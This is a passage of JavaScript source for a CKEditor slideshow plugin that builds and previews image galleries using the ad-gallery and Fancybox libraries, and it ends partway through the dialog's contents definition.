/**
 * The slideshow dialog definition.
 * Copyright (c) 2003-2013, Cricri042. All rights reserved.
 * Targeted for "ad-gallery" JavaScript : http://adgallery.codeplex.com/
 * And "Fancybox" : http://fancyapps.com/fancybox/
 */
/**
 * Debug : var_dump
 *
 * @var: Var
 * @level: Level max
 *
 */

var IMG_PARAM = {"URL":0, "TITLE":1, "ALT":2, "WIDTH":3, "HEIGHT":4};
var pluginPath = CKEDITOR.plugins.get( 'slideshow' ).path;
SCRIPT_JQUERY = "https://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js";
SCRIPT_ADDGAL =  pluginPath+"3rdParty/ad-gallery/jquery.ad-gallery.min.js";
CSS_ADDGAL = pluginPath+"3rdParty/ad-gallery/jquery.ad-gallery.css";
SCRIPT_FANCYBOX = pluginPath+'3rdParty/fancybox2/jquery.fancybox.pack.js?v=2.1.5';
CSS_FANCYBOX = pluginPath+"3rdParty/fancybox2/jquery.fancybox.css?v=2.1.5";


function var_dump(_var, _level) {
  var dumped_text = "";
  if(!_level) _level = 0;

  //The padding given at the beginning of the line.
  var level_padding = "";
  for(var j=0; j<_level+1; j++) level_padding += "    ";

    if(typeof(_var) == 'object') { //Array/Hashes/Objects
      for(var item in _var) {
    var value = _var[item];

    if(typeof(value) == 'object') { // If it is an array,
      dumped_text += level_padding + "'" + item + "' ...\n";
      dumped_text += var_dump(value, _level+1);
    } else {
      dumped_text += level_padding +"'"+ item +"' => \""+ value +"\"\n";
    }
      }
    } else { //Stings/Chars/Numbers etc.
      dumped_text = "===>"+ _var +"<===("+ typeof(_var) +")";
    }
  return dumped_text;
};

var listItem = function( node ) {
return node.type == CKEDITOR.NODE_ELEMENT && node.is( 'li' );
};

var ULItem = function( node ) {
	return node.type == CKEDITOR.NODE_ELEMENT && node.is( 'ul' );
	};

var iFrameItem = function( node ) {
	return node.type == CKEDITOR.NODE_ELEMENT && node.is( 'iframe' );
	};

	Array.prototype.pushUnique = function (item){
		for ( var i = 0; i < this.length ;  i++ ) {
			if (this[i][0] == item[0]) return -1;
		}
	    this.push(item);
	    return this.length - 1;
	};

	Array.prototype.updateVal = function (item, data){
		for ( var i = 0; i < this.length ;  i++ ) {
			if (this[i][0] == item) {
				this[i] = [item, data];
				return true;
			};
		};
		this[i] = [item, data];
		return false;
	};

	Array.prototype.getVal = function (item){
		for ( var i = 0; i < this.length ;  i++ ) {
			if (this[i][0] == item) {
				return this[i][1];
			};
		};
		return null;
	};


// Our dialog definition.
CKEDITOR.dialog.add( 'slideshowDialog', function( editor ) {
	var lang = editor.lang.slideshow;

//----------------------------------------------------------------------------------------------------
// COMBO STUFF
//----------------------------------------------------------------------------------------------------
	// Add a new option to a CHKBOX object (combo or list).
	function addOption( combo, optionText, optionValue, documentObject, index )
	{
		combo = getSelect( combo );
		var oOption;
		if ( documentObject )
			oOption = documentObject.createElement( "OPTION" );
		else
			oOption = document.createElement( "OPTION" );

		if ( combo && oOption && oOption.getName() == 'option' )
		{
			if ( CKEDITOR.env.ie ) {
				if ( !isNaN( parseInt( index, 10) ) )
					combo.$.options.add( oOption.$, index );
				else
					combo.$.options.add( oOption.$ );

				oOption.$.innerHTML = optionText.length > 0 ? optionText : '';
				oOption.$.value     = optionValue;
			}
			else
			{
				if ( index !== null && index < combo.getChildCount() )
					combo.getChild( index < 0 ? 0 : index ).insertBeforeMe( oOption );
				else
					combo.append( oOption );

				oOption.setText( optionText.length > 0 ? optionText : '' );
				oOption.setValue( optionValue );
			}
		} else {
			return false;
		}
		return oOption;
	};
	// Remove all selected options from a CHKBOX object.
	function removeSelectedOptions( combo )
	{
		combo = getSelect( combo );
		// Save the selected index
		var iSelectedIndex = getSelectedIndex( combo );
		// Remove all selected options.
		for ( var i = combo.getChildren().count() - 1 ; i >= 0 ; i-- )
		{
			if ( combo.getChild( i ).$.selected )
				combo.getChild( i ).remove();
		}

		// Reset the selection based on the original selected index.
		setSelectedIndex( combo, iSelectedIndex );
	};
	//Modify option  from a CHKBOX object.
	function modifyOption( combo, index, title, value )
	{
		combo = getSelect( combo );
		if ( index < 0 )
			return false;
		var child = combo.getChild( index );
		child.setText( title );
		child.setValue( value );
		return child;
	};
	function removeAllOptions( combo )
	{
		combo = getSelect( combo );
		while ( combo.getChild( 0 ) && combo.getChild( 0 ).remove() )
		{ /*jsl:pass*/ }
	};
	// Moves the selected option by a number of steps (also negative).
	function changeOptionPosition( combo, steps, documentObject )
	{
		combo = getSelect( combo );
		var iActualIndex = getSelectedIndex( combo );
		if ( iActualIndex < 0 )
			return false;

		var iFinalIndex = iActualIndex + steps;
		iFinalIndex = ( iFinalIndex < 0 ) ? 0 : iFinalIndex;
		iFinalIndex = ( iFinalIndex >= combo.getChildCount() ) ? combo.getChildCount() - 1 : iFinalIndex;

		if ( iActualIndex == iFinalIndex )
			return false;

		var oOption = combo.getChild( iActualIndex ),
			sText	= oOption.getText(),
			sValue	= oOption.getValue();

		oOption.remove();

		oOption = addOption( combo, sText, sValue, ( !documentObject ) ? null : documentObject, iFinalIndex );
		setSelectedIndex( combo, iFinalIndex );
		return oOption;
	};
	function getSelectedIndex( combo )
	{
		combo = getSelect( combo );
		return combo ? combo.$.selectedIndex : -1;
	};
	function setSelectedIndex( combo, index )
	{
		combo = getSelect( combo );
		if ( index < 0 )
			return null;
		var count = combo.getChildren().count();
		combo.$.selectedIndex = ( index >= count ) ? ( count - 1 ) : index;
		return combo;
	};
	function getOptions( combo )
	{
		combo = getSelect( combo );
		return combo ? combo.getChildren() : false;
	};
	function getSelect( obj )
	{
		if ( obj && obj.domId && obj.getInputElement().$ )
			return  obj.getInputElement();
		else if ( obj && obj.$ )
			return obj;
		return false;
	};

	function unselectAll(dialog) {
		var editBtn = dialog.getContentElement( 'slideshowinfoid', 'editselectedbtn');
		var deleteBtn = dialog.getContentElement( 'slideshowinfoid', 'removeselectedbtn');
		editBtn = getSelect( editBtn );
		editBtn.hide();
		deleteBtn = getSelect( deleteBtn );
		deleteBtn.hide();
		var comboList = dialog.getContentElement( 'slideshowinfoid', 'imglistitemsid');
		comboList = getSelect( comboList );
		for ( var i = comboList.getChildren().count() - 1 ; i >= 0 ; i-- )
		{
			comboList.getChild( i ).$.selected = false;
		}
	};

	function unselectIfNotUnique(combo) {
		var dialog = combo.getDialog();
		var selectefItem = null;
		combo = getSelect( combo );
		var cnt = 0;
		var editBtn = dialog.getContentElement( 'slideshowinfoid', 'editselectedbtn');
		var deleteBtn = dialog.getContentElement( 'slideshowinfoid', 'removeselectedbtn');
		for ( var i = combo.getChildren().count() - 1 ; i >= 0 ; i-- )
		{
			var child = combo.getChild( i );
			if ( child.$.selected ) {
				cnt++;
				selectefItem = child;
			}
		}
		if (cnt > 1) {
			unselectAll(dialog);
			return null;
		} else {
			if (cnt == 1) {
				editBtn = getSelect( editBtn );
				editBtn.show();
				deleteBtn = getSelect( deleteBtn );
				deleteBtn.show();
				displaySelected(dialog);
				return selectefItem;
			}
		}
		return null;
	};

	function displaySelected (dialog) {
		if (dialog.openCloseStep == true) return;
		var previewCombo = dialog.getContentElement( 'slideshowinfoid', 'framepreviewid');
		if ( previewCombo.isVisible()) {
			previewSlideShow(dialog);
		} else {
			editeSelected(dialog);
		}
	};

	function selectFirstIfNotUnique(combo) {
		var dialog = combo.getDialog();
		combo = getSelect( combo );
		var firstSelectedInd = 0;
		for ( var i = 0; i < combo.getChildren().count()  ; i++ )
		{
			var child = combo.getChild( i );
			if ( child.$.selected ) {
				selectefItem = child;
				firstSelectedInd = i;
				break;
			}
		}
		setSelectedIndex(combo, firstSelectedInd);
		displaySelected(dialog);
	}

	function getSlectedIndex(dialog) {
		var combo = dialog.getContentElement( 'slideshowinfoid', 'imglistitemsid');
		return getSelectedIndex( combo );
	};

//----------------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------------

	function removePlaceHolderImg(dialog) {
		var urlPlaceHolder =  CKEDITOR.basePath  + 'plugins/slideshow/icons/placeholder.png' ;
		if ((dialog.imagesList.length == 1) && (dialog.imagesList[0][IMG_PARAM.URL] == urlPlaceHolder)) {
			// Remove the place Holder Image
			var combo = dialog.getContentElement( 'slideshowinfoid', 'imglistitemsid');
			combo = getSelect( combo );
			var i = 0;
			// Remove image from image Array
			dialog.imagesList.splice(i, 1);
			// Remove image from combo image list
			combo.getChild( i ).remove();
		}
	}

	function updateImgList(dialog) {
		removePlaceHolderImg(dialog);
		var preview = dialog.previewImage;
		var url = preview.$.src;
		var ratio = preview.$.width / preview.$.height;
		var w = 50;
		var h = 50;
		if (ratio > 1) {
			h = h/ratio;
		} else {
			w = w*ratio;
		}
		var ind = dialog.imagesList.pushUnique([url, '', '', w.toFixed(0), h.toFixed(0)]);
		if (ind >= 0) {
			oOption = addOption( combo, 'IMG_'+ind + ' : ' + url.substring(url.lastIndexOf('/')+1), url, dialog.getParentEditor().document );
			// select index 0
			setSelectedIndex(combo, ind);
			// Update dialog
			displaySelected(dialog);
		}
	};

	function editeSelected(dialog) {
		var combo = dialog.getContentElement( 'slideshowinfoid', 'imglistitemsid');
		var iSelectedIndex = getSelectedIndex( combo );
		var value = dialog.imagesList[iSelectedIndex];

		combo = dialog.getContentElement( 'slideshowinfoid', 'imgtitleid');
		combo = getSelect( combo );
		combo.setValue(value[1]);
		combo = dialog.getContentElement( 'slideshowinfoid', 'imgdescid');
		combo = getSelect( combo );
		combo.setValue(value[2]);
		combo = dialog.getContentElement( 'slideshowinfoid', 'imgpreviewid');
		combo = getSelect( combo );
		//console.log( "VALUE IMG -> " +  value[iSelectedIndex] );
		var imgHtml = '<div style="text-align:center;"> <img src="'+ value[0] +
						'" title="' + value[1] +
						'" alt="' + value[2] +
						'" style=" max-height: 200px;  max-width: 350px;' + '"> </div>';
		combo.setHtml(imgHtml);
		var previewCombo = dialog.getContentElement( 'slideshowinfoid', 'framepreviewid');
		var imgCombo =  dialog.getContentElement( 'slideshowinfoid', 'imgparamsid');
		previewCombo = getSelect( previewCombo );
		previewCombo.hide();
		imgCombo = getSelect( imgCombo );
		imgCombo.show();
	};

	function removeSelected(dialog) {
		var combo = dialog.getContentElement( 'slideshowinfoid', 'imglistitemsid');
		combo = getSelect( combo );
		var someRemoved = false;
		// Remove all selected options.
		for ( var i = combo.getChildren().count() - 1 ; i >= 0 ; i-- )
		{
			if ( combo.getChild( i ).$.selected ) {
				// Remove image from image Array
				dialog.imagesList.splice(i, 1);
				// Remove image from combo image list
				combo.getChild( i ).remove();
				someRemoved = true;
			}
		}
		if (someRemoved) {
			if (dialog.imagesList.length == 0) {
				var url =  CKEDITOR.basePath  + 'plugins/slideshow/icons/placeholder.png' ;
				oOption = addOption( combo, 'IMG_0' + ' : ' + url.substring(url.lastIndexOf('/')+1) , url, dialog.getParentEditor().document );
				 dialog.imagesList.pushUnique([url, lang.imgTitle, lang.imgDesc, '50', '50']);
			}
			// select index 0
			setSelectedIndex(combo, 0);
			// Update dialog
			displaySelected(dialog);
		}
	};

	// To automatically get the dimensions of the poster image
	var onImgLoadEvent = function() {
		// Image is ready.
		var preview = this.previewImage;
		preview.removeListener( 'load', onImgLoadEvent );
		preview.removeListener( 'error', onImgLoadErrorEvent );
		preview.removeListener( 'abort', onImgLoadErrorEvent );
		//console.log( "previewImage -> " + preview );
		updateImgList(this);
	};

	var onImgLoadErrorEvent = function() {
		// Error. Image is not loaded.
		var preview = this.previewImage;
		preview.removeListener( 'load', onImgLoadEvent );
		preview.removeListener( 'error', onImgLoadErrorEvent );
		preview.removeListener( 'abort', onImgLoadErrorEvent );
	};

	function updateTitle(dialog, val) {
		dialog.imagesList[getSlectedIndex(dialog)][IMG_PARAM.TITLE] = val;
		editeSelected(dialog);
	}

	function updateDescription(dialog, val) {
		dialog.imagesList[getSlectedIndex(dialog)][IMG_PARAM.ALT] = val;
		editeSelected(dialog);
	}

	function previewSlideShow(dialog) {
		var previewCombo = dialog.getContentElement( 'slideshowinfoid', 'framepreviewid');
		var imgCombo =  dialog.getContentElement( 'slideshowinfoid', 'imgparamsid');
		imgCombo = getSelect( imgCombo );
		imgCombo.hide();
		previewCombo = getSelect( previewCombo );
		previewCombo.show();
		updateFramePreview(dialog);
	};

	function feedFrame(frame, data) {
		frame.open();
		frame.writeln( data );
		frame.close();
	};

// 	function unprotectRealComments( html )
// 	{
// 		return html.replace( /<!--\{cke_protected\}\{C\}([\s\S]+?)-->/g,
// 			function( match, data )
// 			{
// 				return decodeURIComponent( data );
// 			});
// 	};
//
// 	function unprotectSource( html, editor )
// 	{
// 		return html.replace( /<!--\{cke_protected\}([\s\S]+?)-->/g, function( match, data )
// 			{
// 				return decodeURIComponent( data );
// 			});
// 	}

	function updateFramePreview(dialog) {
		var width = 436;
		var height = 300;
		if ( dialog.params.getVal('showthumbid') == true) {
			height -= 120;
		} else if ( dialog.params.getVal('showcontrolid') == true) {
			height -= 30;
		}
		if (dialog.imagesList.length == 0) return;
		var combo = dialog.getContentElement( 'slideshowinfoid', 'imglistitemsid');
		var iSelectedIndex = getSelectedIndex( combo );
		if (iSelectedIndex < 0) iSelectedIndex = 0;
		var combo = dialog.getContentElement( 'slideshowinfoid', 'framepreviewid');
		var strVar="";
		strVar += "<head>";

		strVar += '<script src="'+SCRIPT_JQUERY+'" type="text/javascript"></script>';
	    strVar += "<script type=\"text\/javascript\" src=\""+SCRIPT_ADDGAL+"\"><\/script>";
	    strVar += "<link rel=\"stylesheet\" type=\"text\/css\" href=\""+CSS_ADDGAL+"\" \/>";
		if ( dialog.params.getVal('openOnClickId') == true) {
		    strVar += "<link rel=\"stylesheet\" type=\"text\/css\" href=\""+CSS_FANCYBOX+"\" \/>";
		    strVar += "<script type=\"text\/javascript\" src=\""+SCRIPT_FANCYBOX+"\"><\/script>";
		    strVar += "<script type=\"text\/javascript\">";
		    strVar += 	createScriptFancyBoxRun(dialog);
		    strVar += "<\/script>";
		}

	    strVar += "<script type=\"text\/javascript\">";
	    strVar += 	createScriptAdGalleryRun(dialog, iSelectedIndex, width, height);
	    strVar += "<\/script>";

	    strVar += "<\/head>";
	    strVar += "<body>";
	    var domGallery = createDOMdGalleryRun(dialog);
		strVar += domGallery.getOuterHtml();
	    strVar += "<\/body>";
	    strVar += "";

		combo = getSelect( combo );
		var theFrame = combo.getFirst( iFrameItem );
		if (theFrame) theFrame.remove();
	    var ifr = null;

	    var w = width+60;
	    var h = height;
		if ( dialog.params.getVal('showthumbid') == true) {
			h += 120;
		} else if ( dialog.params.getVal('showcontrolid') == true) {
			h += 30;
		}
		var iframe = CKEDITOR.dom.element.createFromHtml( '<iframe' +
				' style="width:'+w+'px;height:'+h+'px;background:azure; "'+
				' class="cke_pasteframe"' +
				' frameborder="10" ' +
				' allowTransparency="false"' +
//				' src="' + 'data:text/html;charset=utf-8,' +  strVar + '"' +
				' role="region"' +
				' scrolling="no"' +
				'></iframe>' );

		iframe.setAttribute('name', 'totoFrame');
		iframe.setAttribute('id', 'totoFrame');
		iframe.on( 'load', function( event ) {
			if (ifr != null) return;
			ifr =  this.$;
			if (ifr.contentDocument)
				iframedoc = ifr.contentDocument;
			else if (ifr.contentWindow)
				iframedoc = ifr.contentWindow.document;
			 if (iframedoc){
				 // Put the content in the iframe
				 feedFrame(iframedoc, strVar);
			 } else {
				//just in case of browsers that don't support the above 3 properties.
				//fortunately we don't come across such case so far.
				alert('Cannot inject dynamic contents into iframe.');
			 }
		});
		combo.append(iframe);
	};

	function initImgListFromDOM(dialog, slideShowContainer) {
		var i, image, src;
		var imgW, imgH;
		var arr  = slideShowContainer.$.getElementsByTagName("img");
		combo = dialog.getContentElement( 'slideshowinfoid', 'imglistitemsid');
		for (i = 0; i < arr.length; i++) {
			image = arr[i];
			src = image.src;
			// IE Seems sometime to return 0 !!, So natural Width and Height seems OK
			// If not just pput 50, Not as good but not so bad !!
			imgW =  image.width;
			if (imgW == 0) imgW = image.naturalWidth;
			if (imgW == 0) {
				imgW = 50;
				imgH = 50;
			} else {
				imgH =  image.height;
				if (imgH == 0) imgH = image.naturalHeight;
				if (imgH == 0) {
					imgW = 50;
					imgH = 50;
				}
			}
			var ratio = imgW / imgH;
			var w = 50;
			var h = 50;
			if (ratio > 1) {
				h = h/ratio;
			} else {
				w = w*ratio;
			}
			var ind = dialog.imagesList.pushUnique([src, image.title, image.alt, w, h]);
			if (ind >= 0) {
				oOption = addOption( combo, 'IMG_'+ind + ' : ' + src.substring(src.lastIndexOf('/')+1), src, dialog.getParentEditor().document );
			}
		}
		// select index 0
		setSelectedIndex(combo, 0);
		// Update dialog
		displaySelected(dialog);
    };

	function initImgListFromFresh(dialog) {
		combo = dialog.getContentElement( 'slideshowinfoid', 'imglistitemsid');
		var url =  CKEDITOR.basePath  + 'plugins/slideshow/icons/placeholder.png' ;
		oOption = addOption( combo, 'IMG_0' + ' : ' + url.substring(url.lastIndexOf('/')+1) , url, dialog.getParentEditor().document );
		dialog.imagesList.pushUnique([url, lang.imgTitle, lang.imgDesc, '50', '50']);
		// select index 0
		setSelectedIndex(combo, 0);
		// Update dialog
		displaySelected(dialog);
    };


	function commitSlideShow(dialog) {
		dialog.slideshowDOM.setAttribute('data-'+this.id, this.getValue());
	};

	function loadValue() {
		var dialog = this.getDialog();
		if (dialog.newSlideShowMode) {
			// New fresh SlideShow so let's put dom data attributes from dialog default values
			dialog.slideshowDOM.setAttribute('data-'+this.id, this.getValue());
			switch ( this.type ) {
			case 'checkbox':
				break;
			case 'text':
				break;
			case 'select':
				break;
			default:
			}
		} else {
			// Loaded SlideShow, so update Dialog values from DOM data attributes

			switch ( this.type ) {
			case 'checkbox':
				this.setValue(dialog.slideshowDOM.getAttribute('data-'+this.id) == 'true');
				break;
			case 'text':
				this.setValue(dialog.slideshowDOM.getAttribute('data-'+this.id));
				break;
			case 'select':
				this.setValue(dialog.slideshowDOM.getAttribute('data-'+this.id));
				break;
			default:
			}
		}
	};

	function commitValue() {
		var dialog = this.getDialog();
		dialog.params.updateVal(this.id, this.getValue());
		switch ( this.type ) {
		case 'checkbox':
			break;
		case 'text':
			break;
		case 'select':
			break;
		default:
		}
		displaySelected(dialog);
	};

	function cleanAll(dialog) {
		if ( dialog.previewImage )
		{
			dialog.previewImage.removeListener( 'load', onImgLoadEvent );
			dialog.previewImage.removeListener( 'error', onImgLoadErrorEvent );
			dialog.previewImage.removeListener( 'abort', onImgLoadErrorEvent );
			dialog.previewImage.remove();
			dialog.previewImage = null;		// Dialog is closed.
		}
		dialog.imagesList = null;
		dialog.params = null;
		dialog.slideshowDOM = null;
		combo = dialog.getContentElement( 'slideshowinfoid', 'imglistitemsid');
		removeAllOptions(combo);
		dialog.openCloseStep = false;

	};

	function randomChars(len) {
	    var chars = '';
	    while (chars.length < len) {
	        chars += Math.random().toString(36).substring(2);
	    }
	    // Remove unnecessary additional characters.
	    return chars.substring(0, len);
	}

	var numbering = function( id ) {
		//return CKEDITOR.tools.getNextId() + '_' + id;
		return 'cke_' + randomChars(8) + '_' + id;
	};

	function getImagesContainerBlock(dialog, dom) {
		var obj = dom.getElementsByTag("ul");
		if (obj == null) return null;
		if (obj.count() == 1) {
			return obj.getItem(0);
		};
		return null;
	};

	function createScriptAdGalleryRun(dialog, iSelectedIndex, width, height) {
		var slideshowid =  dialog.params.getVal('slideshowid');
		var galleryId =  'ad-gallery_' + slideshowid;
		var strVar = '';
		var strHook = '';
	    strVar += "$(function() {";
	    if (width == 0) width = "false";
	    if (height == 0) height = dialog.params.getVal('pictheightid');
	    if (dialog.params.getVal('showtitleid') == false) {
	    	strHook = ",  hooks: { displayDescription: function(image) {}}";
	    }
	    var params = "loader_image: '"+pluginPath+"3rdParty/ad-gallery/loader.gif'," +
	    				" width:" + width + ", height:" + height +
	    				", start_at_index: " + iSelectedIndex +
	    				", animation_speed: " + dialog.params.getVal('animspeedid') + strHook +
	    				", update_window_hash: false, effect: '" + dialog.params.getVal('transitiontypeid') +
	    				"',";
	    var slideShowParams = " slideshow: { enable: true, autostart: " + dialog.params.getVal('autostartid') +
	    									", speed: " + dialog.params.getVal('speedid') * 1000 +
	    									",},";
	    strVar += "   var galleries = $('#"+galleryId+"').adGallery({" + params + slideShowParams + "});";
	    strVar += "});";
	    //console.log(strVar);
//	    strVar += "});";
		return strVar;
	};

	function createScriptFancyBoxRun(dialog) {
		var slideshowid =  dialog.params.getVal('slideshowid');
		var galleryId =  'ad-gallery_' + slideshowid;
		var str = '';
//		str +=  "$(document).ready(function() {";
		str += "$(function() {";
		str += "$(\"#"+galleryId+"\").on(\"click\",\".ad-image\",function(){";
		str += "var imgObj =$(this).find(\"img\");";
		str += "var isrc=imgObj.attr(\"src\");";
		str += "var ititle=null;";
		str += "var idesc=null;";
		str += "var iname=isrc.split('/');";
		str += "iname=iname[iname.length-1];";
		str += "var imgdescid=$(this).find(\".ad-image-description\");";
		str += "if(imgdescid){";
		str += "ititle=$(this).find(\".ad-description-title\");";
		str += "if(ititle)ititle=ititle.text();";
		str += "if(ititle!='')ititle='<big>'+ititle+'</big>';";
		str += "idesc=$(this).find(\"span\");";
		str += "if(idesc)idesc=idesc.text();";
		str += "if(idesc!=''){";
		str += "if(ititle!='')ititle=ititle+'<br>';";
		str += "idesc='<i>'+idesc+'</i>';";
		str += "}";
		str += "}";
		str += "$.fancybox.open({";
		str += "href:isrc,";
		str += "beforeLoad:function(){";
		str +="this.title=ititle+idesc;";
		str += "},";
		str +="});";
		str += "});";
		str += "});";
//		str += "});";
		//console.log(str);
		return str;
	};

	function feedUlWithImages(dialog, ulObj) {
		for ( var i = 0; i < dialog.imagesList.length  ; i++ ) {
			var liObj = ulObj.append( 'li' );
			liObj.setAttribute( 'contenteditable', 'false');
			aObj = liObj.append( 'a' );
			aObj.setAttribute( 'href', dialog.imagesList[i][IMG_PARAM.URL] );
			aObj.setAttribute('contenteditable', 'false');
			newImgDOM = aObj.append('img');
			newImgDOM.setAttribute( 'src', dialog.imagesList[i][IMG_PARAM.URL] );
			newImgDOM.setAttribute( 'title', dialog.imagesList[i][IMG_PARAM.TITLE]);
			newImgDOM.setAttribute( 'alt', dialog.imagesList[i][IMG_PARAM.ALT]);
			newImgDOM.setAttribute( 'contenteditable', 'false');
			newImgDOM.setAttribute('width',  dialog.imagesList[i][IMG_PARAM.WIDTH]);
			newImgDOM.setAttribute('height',  dialog.imagesList[i][IMG_PARAM.HEIGHT]);
		}
	};

	function createDOMdGalleryRun(dialog) {
		var slideshowid =  dialog.params.getVal('slideshowid');
		var galleryId =  'ad-gallery_' + slideshowid;
		var displayThumbs = 'display: block;';
		var displayControls = 'display: block;';
		if ( dialog.params.getVal('showthumbid') == false) {
			displayThumbs = 'display: none;';
		}
		if ( dialog.params.getVal('showcontrolid') == false) {
			displayControls = 'visibility: hidden;';
		}
		var slideshowDOM = editor.document.createElement( 'div' );
		slideshowDOM.setAttribute('id', slideshowid );
		slideshowDOM.setAttribute( 'class', 'slideshowPlugin');
		slideshowDOM.setAttribute( 'contenteditable', 'false');

		var galleryDiv =  slideshowDOM.append('div');
		galleryDiv.setAttribute( 'class', 'ad-gallery');
		galleryDiv.setAttribute( 'contenteditable', 'false');
		galleryDiv.setAttribute( 'id', galleryId);

		var wrapperObj =  galleryDiv.append('div');
		wrapperObj.setAttribute( 'class', 'ad-image-wrapper');
		wrapperObj.setAttribute( 'contenteditable', 'false');

		var controlObj =  galleryDiv.append('div');
		controlObj.setAttribute( 'class', 'ad-controls');
		controlObj.setAttribute( 'contenteditable', 'false');
		controlObj.setAttribute( 'style', displayControls);

		var navObj =  galleryDiv.append('div');
		navObj.setAttribute( 'class', 'ad-nav');
		navObj.setAttribute( 'style', displayThumbs);
		navObj.setAttribute( 'contenteditable', 'false');

		var thumbsObj =  navObj.append('div');
		thumbsObj.setAttribute( 'class', 'ad-thumbs');
		thumbsObj.setAttribute( 'contenteditable', 'false');

		var ulObj = thumbsObj.append('ul');
		ulObj.setAttribute('class', 'ad-thumb-list');
		ulObj.setAttribute( 'contenteditable', 'false');

		feedUlWithImages(dialog, ulObj);
		return slideshowDOM;
	};

	function ClickOkBtn(dialog) {
		var extraStyles = {},
		extraAttributes = {};

		dialog.openCloseStep = true;

		// Invoke the commit methods of all dialog elements, so the dialog.params array get Updated.
		dialog.commitContent(dialog);

		// Create a new DOM
	    var slideshowDOM = createDOMdGalleryRun(dialog);

	    // Add data tags to dom
		for ( var i = 0; i < dialog.params.length  ; i++ ) {
			slideshowDOM.data(dialog.params[i][0], dialog.params[i][1]);
		}

		// Add javascript for ""ad-gallery"
		// Be sure the path is correct and file is available !!
		var scriptAdGallery =  CKEDITOR.document.createElement( 'script', {
			attributes: {
				type: 'text/javascript',
				src: SCRIPT_ADDGAL
			}
		});
		slideshowDOM.append(scriptAdGallery);

		if ( dialog.params.getVal('openOnClickId') == true) {
			// Dynamically add CSS for "fancyBox"
			// Be sure the path is correct and file is available !!
			var scriptFancyBoxCss =  CKEDITOR.document.createElement( 'script', {
				attributes: {
					type: 'text/javascript'
				}
			});
			scriptFancyBoxCss.setText("$('head').append('<link rel=\"stylesheet\" href=\""+CSS_FANCYBOX+"\" type=\"text/css\" />');");
			slideshowDOM.append(scriptFancyBoxCss);

			// Add javascript for ""fancyBox"
			// Be sure the path is correct and file is available !!
			var scriptFancyBox =  CKEDITOR.document.createElement( 'script', {
				attributes: {
					type: 'text/javascript',
					src: SCRIPT_FANCYBOX
				}
			});
			slideshowDOM.append(scriptFancyBox);

			// Add RUN javascript for "fancybox"
			var scriptFancyboxRun =  CKEDITOR.document.createElement( 'script', {
				attributes: {
					type: 'text/javascript',
				}
			});
			scriptFancyboxRun.setText(createScriptFancyBoxRun(dialog));
			slideshowDOM.append(scriptFancyboxRun);
		}

		// Dynamically add CSS for "ad-gallery"
		// Be sure the path is correct and file is available !!
		var scriptAdGalleryCss =  CKEDITOR.document.createElement( 'script', {
			attributes: {
				type: 'text/javascript'
			}
		});
		scriptAdGalleryCss.setText("$('head').append('<link rel=\"stylesheet\" href=\""+CSS_ADDGAL+"\" type=\"text/css\" />');");
		slideshowDOM.append(scriptAdGalleryCss);

		// Add RUN javascript for "ad-Gallery"
		var scriptAdGalleryRun =  CKEDITOR.document.createElement( 'script', {
			attributes: {
				type: 'text/javascript',
			}
		});
		scriptAdGalleryRun.setText(createScriptAdGalleryRun(dialog, 0, 0, 0));
		slideshowDOM.append(scriptAdGalleryRun);

		if (dialog.imagesList.length) {
			extraStyles.backgroundImage =  'url("' + dialog.imagesList[0][IMG_PARAM.URL] + '")';
		}
		extraStyles.backgroundSize = '50%';
		extraStyles.display = 'block';
		// Create a new Fake Image
		var newFakeImage = editor.createFakeElement( slideshowDOM, 'cke_slideShow', 'slideShow', false );
		newFakeImage.setAttributes( extraAttributes );
		newFakeImage.setStyles( extraStyles );

		if ( dialog.fakeImage )
		{
			newFakeImage.replace( dialog.fakeImage );
			editor.getSelection().selectElement( newFakeImage );
		}
		else
		{
			editor.insertElement( newFakeImage );
		}

		cleanAll(dialog);
		dialog.hide();
		return true;
	};

	return {
		// Basic properties of the dialog window: title, minimum size.
		title : lang.dialogTitle,
		width: 500,
		height: 600,
		resizable: CKEDITOR.DIALOG_RESIZE_NONE,
		buttons: [
		      	CKEDITOR.dialog.okButton( editor, {
					label: 'OkCK',
					style : 'display:none;',
				}),
		      	CKEDITOR.dialog.cancelButton,

		      	{
		      		id: 'myokbtnid',
		            type: 'button',
		      		label: 'OK',
		      		title: 'Button description',
					style : 'color:white;background:blue;',
		      		accessKey: 'C',
		      		disabled: false,
		      		onClick: function()
		      			{
		      				// code on click
			      			ClickOkBtn(this.getDialog());
		      			},
		      	},
		      ],
		// Dialog window contents definition.
		contents: [
			{
				// Definition of the Basic Settings dialog (page).
				id: 'slideshowinfoid',
				label: 'Basic Settings',
				align : 'center',
				// The tab contents.
				elements: [
							{
								type : 'text',
								id : 'id',
								style : 'display:none;',
								onLoad : function()
								{
								    this.getInputElement().setAttribute( 'readOnly', true );
								},
							},
					{
						type: 'text',
						id: 'txturlid',
						style : 'display:none;',
						label: lang.imgList,
						onChange: function() {
							var dialog = this.getDialog(),
								newUrl = this.getValue();
							if ( newUrl.length > 0 ) { //Prevent from load before onShow
								var preview = dialog.previewImage;
								preview.on( 'load', onImgLoadEvent, dialog );
								preview.on( 'error', onImgLoadErrorEvent, dialog );
								preview.on( 'abort', onImgLoadErrorEvent, dialog );
								preview.setAttribute( 'src', newUrl );
							};
						},
					},
					{
						type : 'button',
						id : 'browse',
						hidden : 'true',
						style : 'display:inline-block;margin-top:0px;',
						filebrowser :
						{
							action : 'Browse',
							target: 'slideshowinfoid:txturlid',
							url: editor.config.filebrowserImageBrowseUrl || editor.config.filebrowserBrowseUrl,
						},
						label : lang.imgAdd,

					},
					{
					type: 'vbox',
				    align: 'center',
					children: [
								{
									type: 'html',
									align : 'center',
									id: 'framepreviewtitleid',
									style: 'font-family: Amaranth; color: #1E66EB;	font-size: 20px; font-weight: bold;',
									html: 'Preview',
								},
								{
									type: 'html',
									id: 'framepreviewid',
									align : 'center',
									style : 'width:500px;height:320px',
									html: '',
								},
								{
									type: 'hbox',
									id: 'imgparamsid',
									style : 'display:none;width:500px;',
									height: '325px',
									children :
										[
											{
												type : 'vbox',
												align : 'center',
												width : '400px',
												children :
												[
													{
														type : 'text',
														id : 'imgtitleid',
														label : lang.imgTitle,
														onChange: function() {
															if ( this.getValue() )
															{
																updateTitle(this.getDialog(), this.getValue());
															}
														},
													},
													{
														type : 'text',
														id : 'imgdescid',
														label : lang.imgDesc,
														onChange: function() {
															if ( this.getValue() )
															{
																updateDescription(this.getDialog(), this.getValue());
															}
														},
													},
													{
														type : 'html',
														id : 'imgpreviewid',
														style : 'width:400px;height:200px;',
														html: '<div>xx</div>',
													}
